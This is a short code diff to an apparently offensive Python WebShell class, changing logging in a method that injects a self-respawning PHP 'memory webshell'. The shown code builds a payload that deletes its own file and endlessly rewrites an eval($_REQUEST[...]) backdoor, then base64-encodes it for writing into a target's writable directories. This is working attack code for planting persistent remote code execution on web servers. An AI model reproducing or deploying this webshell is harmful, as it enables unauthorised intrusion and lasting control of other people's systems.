@@ -97,8 +97,9 @@ class WebShell():
             return []
 
     def auto_inject_memery_webshell(self, filename, password):
-        print "[+] Auto inject memery webshell..."
+        Log.info("Auto inject memery webshell...")
         webshell_content = "<?php set_time_limit(0); ignore_user_abort(true); $filename = '%s'; $password = '%s'; $content = '<?php eval($_REQUEST['.$password.']);?>'; unlink(__FILE__); while(true){ if (!file_exists($filename)){ file_put_contents($filename, $content); } usleep(0x10); } ?>" % (filename, password)
+        Log.info(webshell_content)
         base64_encoded_webshell = webshell_content.encode("base64").replace("\n", "")
         writable_dirs = self.get_writable_directory()
         for writable_dir in writable_dirs:
